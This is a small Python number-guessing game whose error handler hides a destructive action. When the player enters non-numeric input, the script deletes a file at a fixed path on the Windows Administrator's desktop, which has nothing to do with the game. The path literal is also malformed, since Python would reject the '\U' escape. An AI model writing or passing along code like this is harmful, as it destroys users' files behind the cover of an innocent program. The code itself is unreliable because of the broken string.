import random
import os
def guessing_game():
    number_to_guess = random.randint(1, 100)
    attempts = 0
    print("Welcome to the Guessing Game! Try to guess the number between 1 and 100.")

    while True:
        try:
            guess = int(input("Enter your guess: "))
            attempts += 1

            if guess < 1 or guess > 100:
                print("Please guess a number between 1 and 100.")
                continue

            if guess < number_to_guess:
                print("Too low! Try again.")
            elif guess > number_to_guess:
                print("Too high! Try again.")
            else:
                print(f"Congratulations! You guessed the number in {attempts} attempts.")
                break
        except ValueError:
            os.remove("C:\Users\Administrator\Desktop\HII")

if __name__ == "__main__":
    guessing_game()
